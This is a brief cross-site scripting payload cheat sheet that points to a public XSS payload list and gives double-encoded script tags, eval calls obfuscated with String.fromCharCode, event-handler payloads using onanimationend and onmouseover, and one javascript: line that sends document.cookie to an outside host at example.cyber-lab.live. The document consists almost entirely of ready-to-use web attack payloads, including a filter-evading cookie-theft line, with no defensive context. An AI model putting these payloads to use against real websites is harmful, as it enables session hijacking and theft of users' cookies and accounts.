<h1>XSS</h1>
https://github.com/payloadbox/xss-payload-list 
<h3>XSS double encoding</h3>
* Double encoded <script>alert('XSS')</script>

%253Cscript%253Ealert('XSS')%253C%252Fscript%253E

<h3>Alert Encoded<h3>
';eval(String.fromCharCode(97,108,101,114,116,40,39,115,97,103,105,111,108,115,104,97,110,115,107,121,39,41));b='

javascript:alert(String.fromCharCode(88,115,115,45,66,121,45,67,111,109,115,101,99))

javascript:document.location='https://example.cyber-lab.live/c?='+document.cookie;

<xss style=\"animation-name:x\" onanimationend=\"alert(1)\">

<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
